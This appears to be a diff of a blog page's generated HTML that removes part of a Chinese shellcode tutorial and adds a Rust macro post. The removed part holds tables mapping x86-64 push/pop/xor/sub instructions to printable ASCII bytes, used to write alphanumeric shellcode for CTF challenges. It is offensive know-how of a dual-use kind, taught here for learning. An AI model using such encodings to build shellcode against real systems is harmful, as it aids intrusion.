-<td>AP</td>
-</tr>
-<tr>
-<td>pop r9</td>
-<td>AY</td>
-<td>push  r9</td>
-<td>AQ</td>
-</tr>
-<tr>
-<td>pop r10</td>
-<td>AZ</td>
-<td>push  r10</td>
-<td>AR</td>
-</tr>
-<tr>
-<td>pop r11</td>
-<td>A[</td>
-<td>push  r11</td>
-<td>AS</td>
-</tr>
-<tr>
-<td>pop r12</td>
-<td>A\</td>
-<td>push  r12</td>
-<td>AT</td>
-</tr>
-<tr>
-<td>pop r13</td>
-<td>A]</td>
-<td>push  r13</td>
-<td>AU</td>
-</tr>
-<tr>
-<td>pop r14</td>
-<td>A^</td>
-<td>push  r14</td>
-<td>AV</td>
-</tr>
-<tr>
-<td>pop r15</td>
-<td>A_</td>
-<td>push  r15</td>
-<td>AW</td>
-</tr>
-</tbody></table>
-<h4 id="xor-amp-add"><a href="#xor-amp-add" class="headerlink" title="xor &amp; add"></a>xor &amp; add</h4><ul>
-<li><code>xor reg8, im8</code> , <code>xor reg16, im16</code> , <code>xor reg32/reg64, im32 </code>  （试了一下好像只有 rax 系列的才行？）</li>
-<li><code>xor reg8/reg16/reg32/reg64, [mem8/mem16/mem32/mem64]</code> （如果要类似 rax + xxxx这样子的地址最好还是加1字节偏移吧，超过一个字节（如：[rax + 0x40404040] 就很难全是可见字符了）</li>
-<li><code>sub reg8, im8</code></li>
-</ul>
-<p><strong>example：</strong></p>
-<table>
-<thead>
-<tr>
-<th>汇编</th>
-<th>机器猫</th>
-<th>汇编</th>
-<th>机器猫</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>xor rax, 0x41424344</td>
-<td>H5DCBA</td>
-<td>xor eax, 0x41424344</td>
-<td>5DCBA</td>
-</tr>
-<tr>
-<td>xor ax, 0x4141</td>
-<td>f5AA</td>
-<td>xor ax, 0x6161</td>
-<td>f5aa</td>
-</tr>
-<tr>
-<td>xor al, 0x41</td>
-<td>4A</td>
-<td>xor al, 0x61</td>
-<td>4a</td>
-</tr>
-<tr>
-<td>xor al, byte [rbx + 0x40]</td>
-<td>2CA</td>
-<td>xor bx, [rcx + 0x41]</td>
-<td>f3YA</td>
-</tr>
-<tr>
-<td>xor edi, [rax + 0x40]</td>
-<td>3x@</td>
-<td>xor rbx, [rbp + 0x40]</td>
-<td>H3]@</td>
-</tr>
-<tr>
-<td>sub rax, 0x41424344</td>
-<td>H-DCBA</td>
-<td>sub eax, 0x41424344</td>
-<td>-DCBA</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p><strong>todo</strong></p>
+<p>使用示范：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">generate_macros! &#123;</span><br><span class="line">    hello =&gt; <span class="string">&quot;Hello, &#123;&#125;!&quot;</span>,</span><br><span class="line">    goodbye =&gt; <span class="string">&quot;Goodbye, &#123;&#125;!&quot;</span>,</span><br><span class="line">    hhh =&gt; <span class="string">&quot;hhh, &#123;&#125; and &#123;&#125;!&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    hello!(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    goodbye!(<span class="string">&quot;world&quot;</span>); </span><br><span class="line">    hhh!(<span class="string">&quot;world&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如此，写任意格式的字符串就不需要在 generate_macros 那里添加新的匹配模式了。</p>
+<h2 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h2><p>为了避免在 macro_rules 中定义 macro_rules 时错误的解析内层声明宏的 <code>$( xxx )*</code> 这一类模式，需要把这部分移动到 <code>proc-macro</code> 中。</p>
 
     </div>
 
@@ -557,7 +335,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="http://hacbit.tech/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/" title="Shellcode编写入门">http://hacbit.tech/Shellcode编写入门/</a>
+    <a href="http://hacbit.tech/rust%E5%AE%8F%E9%AD%94%E6%B3%95-2/" title="rust宏魔法-2">http://hacbit.tech/rust宏魔法-2/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
@@ -593,13 +371,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/RISC-V%E5%85%A5%E9%97%A8/" rel="prev" title="RISC-V入门">
-      <i class="fa fa-chevron-left"></i> RISC-V入门
+    <a href="/rust%E5%AE%8F%E9%AD%94%E6%B3%95-1/" rel="prev" title="rust宏魔法(1)">
+      <i class="fa fa-chevron-left"></i> rust宏魔法(1)
     </a></div>
-      <div class="post-nav-item">
-    <a href="/Rust-QuickStart/" rel="next" title="Rust-QuickStart">
-      Rust-QuickStart <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -658,7 +433,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8"><span class="nav-number">1.</span> <span class="nav-text">Shellcode编写入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%89%8B%E5%86%99shellcode%EF%BC%9F"><span class="nav-number">1.1.</span> <span class="nav-text">为什么要手写shellcode？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="nav-number">1.2.</span> <span class="nav-text">开始之前</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E7%AE%80%E5%8C%96%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90%E7%9A%84shellcode%E5%BC%80%E5%A7%8B"><span class="nav-number">1.3.</span> <span class="nav-text">从简化工具生成的shellcode开始</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OK%EF%BC%8C%E4%BD%A0%E5%B7%B2%E7%BB%8F%E5%AD%A6%E4%BC%9A%E6%89%8B%E6%90%93%E4%BA%86%EF%BC%8C%E7%8E%B0%E5%9C%A8%E6%9D%A5%E5%AE%9E%E6%88%98%E5%90%A7"><span class="nav-number">1.4.</span> <span class="nav-text">OK，你已经学会手搓了，现在来实战吧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#moectf-changeable-shellcode"><span class="nav-number">1.4.1.</span> <span class="nav-text">moectf changeable_shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84%E8%A6%81%E6%B1%82%E7%9A%84shellcode"><span class="nav-number">1.5.</span> <span class="nav-text">一些特殊的要求的shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="nav-number">1.5.1.</span> <span class="nav-text">可见字符限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#push-amp-pop"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">push &amp; pop</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xor-amp-add"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">xor &amp; add</span></a></li></ol></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Rust%E5%AE%8F%E9%AD%94%E6%B3%95%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E8%BE%91%EF%BC%88"><span class="nav-number">1.</span> <span class="nav-text">Rust宏魔法——第二辑（</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%81%E6%B5%81"><span class="nav-number">1.1.</span> <span class="nav-text">省流</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
